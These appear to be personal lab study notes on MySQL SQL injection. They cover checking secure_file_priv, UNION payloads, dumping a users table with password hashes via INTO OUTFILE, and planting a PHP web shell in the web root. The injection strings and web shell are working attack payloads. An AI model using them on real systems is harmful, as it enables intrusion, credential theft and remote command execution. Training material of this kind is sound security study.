
The <span style="color:rgb(255, 0, 0)">S</span><span style="color:rgb(255, 0, 0)">elect into outfile</span> statement can be used to write data into a file 

first we need to check if we are able to: 

We can check the <span style="color:rgb(255, 0, 0)">secure_file_priv</span> variable 
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

but since we are using a union injection we need to look at it using a SELECT statement
variables and configurations are stored on the INFORMATION_SCHEMA database. 
we should find the variable in the global_variables table. This table has two columns: 
variable_name; variable_value

so our final query looks like this: 

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

in an injection it would look something like this 
```sql
' UNION SELECT null, variable_name, variable_value, null FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
as you can see we also need to fill in junk data to match the amount of columns

if the value is empty we should be able to read/write files to any location

------
SELECT INTO OUTFILE

if we have confirmed that we can write to a file we can use the following statements to write to files 

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```shell-session
cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```shell-session
Pangulin@htb[/htb]$ cat /tmp/test.txt 

this is a test
```

this is how to write to a file in sql. 

And this is how to use it in an injection

```sql
' union select null,'file written successfully!',null,null into outfile '/var/www/html/proof.txt'-- -
```


-----
Wite a webshell

```php
<?php system($_REQUEST[0]); ?>
```

```sql
' union select null,'<?php system($_REQUEST[0]); ?>', null, null into outfile '/var/www/html/shell.php'-- -
```

we have set the parameter to 0 so to execute a command we need to set ?0="command"

(to find the shell.php after upload just look for /shell.php (not /var/www/html/shell.php))

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

we might find information about the base web directory by looking at where the default .php site (index.php for example) is beeing served from and add that to the end of the regular default path 